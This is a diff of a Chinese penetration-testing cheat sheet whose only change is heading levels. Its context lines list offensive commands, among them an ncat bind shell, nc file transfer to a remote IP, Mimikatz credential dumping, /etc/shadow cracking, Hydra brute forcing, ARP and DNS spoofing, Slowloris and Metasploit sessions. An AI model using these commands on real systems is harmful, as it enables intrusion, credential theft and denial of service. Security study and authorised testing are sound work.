@@ -13,7 +13,7 @@ reboot                               //重启电脑
 
 ## 基本工具
 
-#### NC
+### NC
 
 ```
 -h     //显示帮助选项
@@ -31,7 +31,7 @@ A：nc -lp 端口 | 解密方式 > 文件
 B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
 ```
 
-#### Ncat
+### Ncat
 
 ```
 --allow         //只允许给定的主机连接到 ncat
@@ -42,7 +42,7 @@ A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
 B：ncat -nv IP 地址 端口 --ssl
 ```
 
-#### SSH
+### SSH
 
 ```
 service ssh start/restart/stop        #开启/重启/停止ssh服务
@@ -66,7 +66,7 @@ permitrootlogin yes
 -D <lport>                            #指定本地机器"动态的"应用程序端口转发
 ```
 
-#### FTP
+### FTP
 
 ```
 service vsftpd start/restart/stop     #开启/重启/停止ftp服务
@@ -88,7 +88,7 @@ echo bye>>ftp.txt
 ftp -s:ftp.txt
 ```
 
-#### SMTP
+### SMTP
 
 ```
 /var/mail/              #邮件日志
@@ -103,7 +103,7 @@ quit                    #结束会话
 
 ## 信息收集
 
-#### 第三方
+### 第三方
 
 - https://fofa.so
 
@@ -115,7 +115,7 @@ quit                    #结束会话
 
 - https://www.tianyancha.com
 
-#### Google
+### Google
 
 ```
 intitle:                         //搜索网页标题中是否有我们所要找的字符
@@ -129,7 +129,7 @@ cache:                           //网页快照,google将返回给你他储存�
 index of                         //发现允许目录浏览的web网站
 ```
 
-#### Nmap
+### Nmap
 
 - 主机发现
 
@@ -182,7 +182,7 @@ index of                         //发现允许目录浏览的web网站
 
 ## Web 程序
 
-#### dirb
+### dirb
 
 > dirb URL \[file] \[options]
 
@@ -199,7 +199,7 @@ index of                         //发现允许目录浏览的web网站
 -z <s>                            //添加一个毫秒的延迟,以避免造成过多的溢出
 ```
 
-#### skipfish
+### skipfish
 
 > dpkg -L skipfish \| grep wl
 >
@@ -224,7 +224,7 @@ index of                         //发现允许目录浏览的web网站
 -l num                            //每秒最大请求数
 ```
 
-#### sqlmap
+### sqlmap
 
 ```
 -d                                #DBMS://user:password@ip:port/database_name
@@ -245,7 +245,7 @@ index of                         //发现允许目录浏览的web网站
 --technique=TECH                  #要使用的SQL注入技术(默认为“BEUSTQ”)
 ```
 
-#### wpscan
+### wpscan
 
 ```
 --url url                         #要扫描博客的URL
@@ -269,7 +269,7 @@ index of                         //发现允许目录浏览的web网站
 
 ## 密码破解
 
-#### Hydra
+### Hydra
 
 > hydra -l 用户名 -P 密码字典 -t 线程数 -vV -e ns 主机地址 指定服务
 >
@@ -293,7 +293,7 @@ index of                         //发现允许目录浏览的web网站
 -f                             //当破解成功时就中止
 ```
 
-#### Medusa
+### Medusa
 
 > medusa -h 主机 IP -u 用户名 -P 字典 -e ns -f -M service 服务
 
@@ -317,7 +317,7 @@ index of                         //发现允许目录浏览的web网站
 -v <0-6>                        //显示详细信息
 ```
 
-#### Mimikatz
+### Mimikatz
 
 ```
 privilege::debug
@@ -325,7 +325,7 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords full
 ```
 
-#### John
+### John
 
 > unshadow /etc/passwd /etc/shadow > passwd
 >
@@ -348,7 +348,7 @@ sekurlsa::logonpasswords full
 --format=name                    //强制输入name类型的哈希
 ```
 
-#### Hashcat
+### Hashcat
 
 > hashcat -a 0/1/3 -m typeID 字段/文件 字典/暴力 ...
 
@@ -366,7 +366,7 @@ sekurlsa::logonpasswords full
 
 ## 嗅探/欺骗
 
-#### ARP
+### ARP
 
 ```
 echo 1 > /proc/sys/net/ipv4/ip_forward            //路由转发
@@ -374,7 +374,7 @@ arpspoof -i eth0 -t 192.168.0.144 192.168.0.1     //arp欺骗
 driftnet -i eth0                                  //图片嗅探
 ```
 
-#### Bettercap
+### Bettercap
 
 > 开启本地(远程)的 WebUI -------→ bettercap -caplet http(s)-ui
 
@@ -398,7 +398,7 @@ set dns.spoof.address desired_IP          //设置要重定向的地址
 
 > iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.0.1 -j DROP
 
-#### slowhttptest
+### slowhttptest
 
 ```
 -H              //Slowloris模式:完整http请求是以\r\n\r\n结尾,攻击时仅发送\r\n(耗尽应用并发连接池)
@@ -423,7 +423,7 @@ set dns.spoof.address desired_IP          //设置要重定向的地址
 
 ## Metasploit
 
-#### 常用命令
+### 常用命令
 
 ```
 search exploit/multi/handler
@@ -436,7 +436,7 @@ sessions -u ID
 route add 192.168.0.0/24 ID
 ```
 
-#### Meterpreter
+### Meterpreter
 
 ```
 background                      //当前会话退至后台
